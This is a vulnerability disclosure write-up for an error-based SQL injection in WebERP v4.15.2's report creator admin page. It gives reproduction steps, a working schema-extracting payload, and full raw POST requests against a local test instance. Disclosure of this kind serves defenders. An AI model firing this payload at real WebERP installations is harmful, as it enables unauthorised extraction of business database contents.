# CVE-2025-46053

---

## SQL Injection


An error-based SQL Injection (SQLi) vulnerability in WebERP v4.15.2 allows attackers to execute arbitrary SQL commands and extract sensitive data by injecting a crafted payload into the ReportID and ReplaceReportID parameters within a POST request to /reportwriter/admin/ReportCreator.php

* Vulnerable Endpoint: /reportwriter/admin/ReportCreator.php
* Vulnerable Param: ReportID, ReplaceReportID
* Payload: 
```
1 AND GTID_SUBSET(CONCAT((SELECT MID((IFNULL(CAST(schema_name AS NCHAR),1)),1,190) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 2,1)),1)
```

---

### Steps to reproduce:

1.) Authenticate as Admin user and proceed to Setup > Report Builder Tool:
![[Pasted image 20250513115107.png]]

2.) Go through the report building process until you see the following request:

```
POST /reportwriter/admin/ReportCreator.php?action=step3
```

![[Pasted image 20250513115128.png]]

3.) Append a â€˜ to ReplaceReportID and observe the DB Error:
![[Pasted image 20250513115143.png]]

4.) Get the DB name through error based SQLi:
```
1 AND GTID_SUBSET(CONCAT((SELECT MID((IFNULL(CAST(schema_name AS NCHAR),1)),1,190) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT 2,1)),1)
```

![[Pasted image 20250513115205.png]]

5.) Automate this process with SQLMap:
![[Pasted image 20250513115338.png]]


6.) Confirm this vulnerability with ReportID parameter:
![[Pasted image 20250513115503.png]]



--- 

### Vulnerable Request for ReplaceReportId parameter:
```
POST /reportwriter/admin/ReportCreator.php?action=step3 HTTP/1.1
Content-Length: 298
Host: localhost:8083
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Origin: http://localhost:8083
Referer: http://localhost:8083/reportwriter/admin/ReportCreator.php?action=step2
Cookie: <cookie>
Upgrade-Insecure-Requests: 1
Priority: u=0, i
Connection: close

FormID=dfecb1c0a019c47346bfab0d39d1f1789f15e826&ReportID=1&Type=1&ReplaceReportID=1%20AND%20GTID_SUBSET(CONCAT((SELECT%20MID((IFNULL(CAST(schema_name%20AS%20NCHAR)%2c1))%2c1%2c190)%20FROM%20INFORMATION_SCHEMA.SCHEMATA%20LIMIT%202%2c1))%2c1)&ReportName=&GroupName=ord&FormGroup=gl%3Achk&todo=Replace
```


### Vulnerable Request for ReportID parameter:
```
POST /reportwriter/admin/ReportCreator.php?action=step6 HTTP/1.1
Host: localhost:8083
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 99
Origin: http://localhost:8083
Connection: close
Referer: http://localhost:8083/reportwriter/admin/ReportCreator.php?action=step5
Cookie: <cookie>
Upgrade-Insecure-Requests: 1
Priority: u=0, i

FormID=dfecb1c0a019c47346bfab0d39d1f1789f15e826&ReportID=143&Type=rpt&ReportName=test&todo=Continue
```



